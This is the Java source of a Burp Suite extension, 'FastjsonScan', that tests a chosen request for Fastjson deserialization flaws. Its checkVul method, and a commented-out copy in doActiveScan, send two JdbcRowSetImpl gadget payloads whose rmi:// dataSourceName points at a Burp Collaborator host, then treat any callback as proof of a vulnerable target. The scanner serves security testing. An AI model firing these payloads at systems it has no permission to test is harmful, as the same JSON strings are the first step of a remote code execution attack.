package burp;

import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import javax.swing.*;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.TableModel;


public class BurpExtender extends AbstractTableModel implements IBurpExtender, IScannerCheck, ITab, IMessageEditorController, IContextMenuFactory{
    public IBurpExtenderCallbacks callbacks;
    public IExtensionHelpers helpers;
    public PrintWriter stdout;
    private JSplitPane splitPane;
    private IMessageEditor requestViewer;
    private IMessageEditor responseViewer;
    private Table logTable;
    private final List<LogEntry> log = new ArrayList<LogEntry>();
    private IHttpRequestResponse currentlyDisplayedItem;
    // 这个方法很重要
    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        this.helpers = callbacks.getHelpers();
        this.stdout.println("[+]作 者:阿信");
        this.stdout.println("[+]公众号:一个安全研究员");
        this.stdout.println("[+]插件名：Fastjson Scan");
        this.stdout.println("######################");
        this.stdout.println("Have Fun!");
        callbacks.setExtensionName("FastjsonScan");
        callbacks.registerScannerCheck(this);
        callbacks.registerContextMenuFactory(this);
        SwingUtilities.invokeLater(new Runnable(){
            @Override
            public void run() {
                splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
                logTable = new Table(BurpExtender.this);
                JScrollPane scrollPane = new JScrollPane(logTable);
                splitPane.setLeftComponent(scrollPane);

                JTabbedPane tabs = new JTabbedPane();
                requestViewer = BurpExtender.this.callbacks.createMessageEditor(BurpExtender.this, false);
                responseViewer = BurpExtender.this.callbacks.createMessageEditor(BurpExtender.this, false);
                tabs.addTab("Request", requestViewer.getComponent());
                tabs.addTab("Response", responseViewer.getComponent());
                splitPane.setRightComponent(tabs);

                BurpExtender.this.callbacks.customizeUiComponent(splitPane);
                BurpExtender.this.callbacks.customizeUiComponent(logTable);
                BurpExtender.this.callbacks.customizeUiComponent(scrollPane);
                BurpExtender.this.callbacks.customizeUiComponent(tabs);

                BurpExtender.this.callbacks.addSuiteTab(BurpExtender.this);
            }
        });
    }

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        return null;
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        // this.stdout.println(insertionPoint.getInsertionPointType());
//        List<String> payloads = new ArrayList<String>();
//        URL url = this.helpers.analyzeRequest(baseRequestResponse).getUrl();
//        payloads.add("{\"axin\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"is\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://%s/aaa\",\"autoCommit\":true}}");
//        payloads.add("{\"handsome\":{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://%s/aaa\",\"autoCommit\":true}}");
//        String method = this.helpers.analyzeRequest(baseRequestResponse).getMethod();
//        byte content_type = this.helpers.analyzeRequest(baseRequestResponse).getContentType();
//        List<String> headers =  this.helpers.analyzeRequest(baseRequestResponse).getHeaders();
//        try{
//            if(method.equals("POST") && content_type == 4){
//                IHttpService iHttpService = baseRequestResponse.getHttpService();
//                IBurpCollaboratorClientContext context= this.callbacks.createBurpCollaboratorClientContext();
//                String dnslog = context.generatePayload(true);
//                this.stdout.println(dnslog);
//                for (String payload:payloads){
//                    payload = String.format(payload, dnslog);
//                    byte[] bytePayload = this.helpers.stringToBytes(payload);
//                    byte[] postMessage = this.helpers.buildHttpMessage(headers, bytePayload);
//                    // 向目标发送payload
//                    IHttpRequestResponse resp = this.callbacks.makeHttpRequest(iHttpService, postMessage);
//                    Thread.sleep(1000);
//                    List<IBurpCollaboratorInteraction> dnsres = context.fetchCollaboratorInteractionsFor(dnslog);
//                    this.stdout.println(dnsres);
//                    if(!dnsres.isEmpty()){
//                        this.stdout.println("found!!!");
//                        List<IScanIssue> issues = new ArrayList<>(1);
//                        issues.add(new CustomScanIssue(
//                                iHttpService,
//                                url,
//                                new IHttpRequestResponse[]{resp},
//                                "json unserialize",
//                                "json unserialize is terrible!!!!By the way,tntaxin is handsome,lol",
//                                "High"
//                        ));
//                        return issues;
//                    }
//                }
//            }
//        }catch (Exception e){
//            e.printStackTrace();
//        }
        return null;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        return 0;
    }

    // fastjson反序列化检测代码
    // baseRequestResponse：burp封装好的请求记录对象，这个对象里存储着一次请求的所有信息（请求头、url、请求方法、响应等)
    // row: 指明目前检测的是哪一行的请求记录
    public void checkVul(IHttpRequestResponse baseRequestResponse, int row){
        List<String> payloads = new ArrayList<String>();
        // 这里获得的url是完整的url
        URL url = this.helpers.analyzeRequest(baseRequestResponse).getUrl();
        // 据说这两个payload可以涵盖目前所有版本的fastjson
        payloads.add("{\"axin\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"is\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://%s/aaa\",\"autoCommit\":true}}");
        payloads.add("{\"handsome\":{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://%s/aaa\",\"autoCommit\":true}}");
        String method = this.helpers.analyzeRequest(baseRequestResponse).getMethod();
        // 返回的是一个字节，不同的content-type用不同的数字代表，其中4表示application/json
        byte content_type = this.helpers.analyzeRequest(baseRequestResponse).getContentType();
        // 拿到的headers是一个数组类型，每一个元素都是类似这样：Host: 127.0.0.1
        List<String> headers =  this.helpers.analyzeRequest(baseRequestResponse).getHeaders();
        try{
            if(method.equals("POST") && content_type == 4){
                IHttpService iHttpService = baseRequestResponse.getHttpService();
                IBurpCollaboratorClientContext context= this.callbacks.createBurpCollaboratorClientContext();
                // 一个burp提供的dnslog平台
                String dnslog = context.generatePayload(true);
                List<IBurpCollaboratorInteraction> dnsres = new ArrayList<>();
                this.stdout.println(dnslog);
                for (String payload:payloads){
                    payload = String.format(payload, dnslog);
                    byte[] bytePayload = this.helpers.stringToBytes(payload);
                    byte[] postMessage = this.helpers.buildHttpMessage(headers, bytePayload);
                    // 向目标发送payload
                    IHttpRequestResponse resp = this.callbacks.makeHttpRequest(iHttpService, postMessage);
                    // 担心目标有延迟，所有延时一秒再查看dnslog平台
                    Thread.sleep(1000);
                    // 返回的是一个数组
                    dnsres = context.fetchCollaboratorInteractionsFor(dnslog);
                    this.stdout.println(dnsres);
                    if(!dnsres.isEmpty()){
                        this.stdout.println("found!!!");
                        // 漏洞存在就更新表格中存在漏洞那一行的数据
                        LogEntry logEntry = new LogEntry(url, "finished", "vul!!!", resp);
                        log.set(row, logEntry);
                        // 这个方法是swing中的一个方法，会通知表格更新指定行的数据
                        fireTableRowsUpdated(row, row);
                        break;
                    }
                }
                if(dnsres.isEmpty()){
                    LogEntry logEntry = new LogEntry(url, "finished", "not vul", baseRequestResponse);
                    log.set(row, logEntry);
                    fireTableRowsUpdated(row, row);
                }
            }else{
                // 如果使用者将非post类型或者非json数据的请求发送到fastjson scan中，则会直接提示not supporeted
                LogEntry logEntry = new LogEntry(url, "not supported", "not supported", baseRequestResponse);
                log.set(row, logEntry);
                fireTableRowsUpdated(row, row);
            }
        }catch (Exception e){
            this.stdout.println(e);
            e.printStackTrace();
        }
    }
    // tab页的显示名称
    @Override
    public String getTabCaption() {
        return "Fastjson scan";
    }

    @Override
    public Component getUiComponent() {
        return splitPane;
    }

    @Override
    public int getRowCount() {
        return log.size();
    }

    @Override
    public int getColumnCount() {
        return 3;
    }

    @Override
    public String getValueAt(int rowIndex, int columnIndex) {
        LogEntry logEntry = log.get(rowIndex);

        switch (columnIndex)
        {
            case 0:
                return logEntry.url.toString();
            case 1:
                return logEntry.status;
            case 2:
                return logEntry.res;
            default:
                return "";
        }
    }

    @Override
    public String getColumnName(int column) {
        switch (column){
            case 0:
                return "URL";
            case 1:
                return "Status";
            case 2:
                return "result";
            default:
                return "";
        }
    }

    @Override
    public IHttpService getHttpService() {
        return currentlyDisplayedItem.getHttpService();
    }

    @Override
    public byte[] getRequest() {
        return currentlyDisplayedItem.getRequest();
    }

    @Override
    public byte[] getResponse() {
        return currentlyDisplayedItem.getResponse();
    }

    // 这个方法就是讲fastjson scan添加到菜单中
    @Override
    public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation) {
        List<JMenuItem> menus = new ArrayList<>(1);
        IHttpRequestResponse responses[] = invocation.getSelectedMessages();
        JMenuItem menuItem = new JMenuItem("Send to FastjsonScan");
        menus.add(menuItem);
        menuItem.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                // logTable.addRowSelectionInterval();
                int row = log.size();
                LogEntry logEntry = new LogEntry(helpers.analyzeRequest(responses[0]).getUrl(), "scanning", "", responses[0]);
                log.add(logEntry);
                fireTableRowsInserted(row, row);
                // 在事件触发时是不能发送网络请求的，否则可能会造成整个burp阻塞崩溃，所以必须要新起一个线程来进行漏洞检测
                Thread thread = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        checkVul(responses[0], row);
                    }
                });
                thread.start();
            }
        });
        return menus;
    }

    // 用于描述一条请求记录的数据结构
    private static class LogEntry{
        final URL url;
        final String status;
        final String res;
        final IHttpRequestResponse requestResponse;

        LogEntry(URL url, String status, String res, IHttpRequestResponse requestResponse) {
            this.url = url;
            this.status = status;
            this.res = res;
            this.requestResponse = requestResponse;
        }
    }

    // 自定义table的changeSelection方法，将request\response展示在正确的窗口中
    private class Table extends JTable
    {
        public Table(TableModel tableModel)
        {
            super(tableModel);
        }

        @Override
        public void changeSelection(int row, int col, boolean toggle, boolean extend)
        {
            // show the log entry for the selected row
            LogEntry logEntry = log.get(row);
            requestViewer.setMessage(logEntry.requestResponse.getRequest(), true);
            responseViewer.setMessage(logEntry.requestResponse.getResponse(), false);
            currentlyDisplayedItem = logEntry.requestResponse;

            super.changeSelection(row, col, toggle, extend);
        }
    }
}

// 自定义Issue,在本插件中没有使用，这个是之前搭配scanner使用的，但是这个方案被我pass了
// 之前的方案是这样的，利用scanner的被动扫描或者主动扫描来验证漏洞，但是这会带来一个问题
// 那就是插件会对所有的json请求进行漏洞检测，但是这不是我想要的，因为很多json请求一看就知道不可能存在漏洞
// 所以，最好的解决方案就是我们根据经验过滤一遍请求，然后对我们认为可能存在fastjson反序列化的漏洞进行扫描
// 于是就采用了你看到的这种[send to FastjsonScan]的方案
class CustomScanIssue implements IScanIssue{
    private IHttpService httpService;
    private URL url;
    private IHttpRequestResponse[] httpMessages;
    private String name;
    private String detail;
    private String severity;

    public CustomScanIssue(
            IHttpService httpService,
            URL url,
            IHttpRequestResponse[] httpMessages,
            String name,
            String detail,
            String severity)
    {
        this.httpService = httpService;
        this.url = url;
        this.httpMessages = httpMessages;
        this.name = name;
        this.detail = detail;
        this.severity = severity;
    }

    @Override
    public URL getUrl() {
        return url;
    }

    @Override
    public String getIssueName() {
        return name;
    }

    @Override
    public int getIssueType() {
        return 0;
    }

    @Override
    public String getSeverity() {
        return severity;
    }

    @Override
    public String getConfidence() {
        return "Certain";
    }

    @Override
    public String getIssueBackground() {
        return null;
    }

    @Override
    public String getRemediationBackground() {
        return null;
    }

    @Override
    public String getIssueDetail() {
        return detail;
    }

    @Override
    public String getRemediationDetail() {
        return null;
    }

    @Override
    public IHttpRequestResponse[] getHttpMessages() {
        return httpMessages;
    }

    @Override
    public IHttpService getHttpService() {
        return httpService;
    }
}